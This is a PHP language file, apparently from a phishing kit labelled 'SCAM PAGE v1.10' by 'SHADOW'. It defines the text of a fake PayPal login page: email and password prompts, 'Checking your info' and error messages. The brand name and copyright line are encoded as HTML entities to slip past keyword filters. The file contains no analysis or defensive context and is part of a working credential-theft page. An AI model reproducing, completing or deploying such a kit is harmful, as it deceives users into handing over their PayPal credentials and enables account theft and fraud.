<?php
/*   
   _____   _                   _                       
  / ____| | |                 | |                      
 | (___   | |__     __ _    __| |   ___   __      __   
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /   
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /   
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     
                                                                                
                              #=======================#
                              #   SCAM PAGE v1.10     #
                              #        SHADOW         #
                              #=======================#
                   
*/
session_start();
error_reporting(0); 
/////////// INDEX LOGIN ///////////////////////////////////////////
$Z118_01 = "Log in to your Account";
$Z118_02 = "Email";
$Z118_03 = "Password";
$Z118_04 = "Email address is required.";
$Z118_05 = "Password is required.";
$Z118_06 = "Log In";
$Z118_07 = "Having trouble logging in?";
$Z118_08 = "Sign Up";
$Z118_09 = "Privacy";
$Z118_10 = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;";
$Z118_11 = "Copyright © 1999-".date('Y')." &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2E;";
$Z118_12 = "Checking your info…";
$Z118_13 = "Some of your info isn't correct. Please try again.";

?>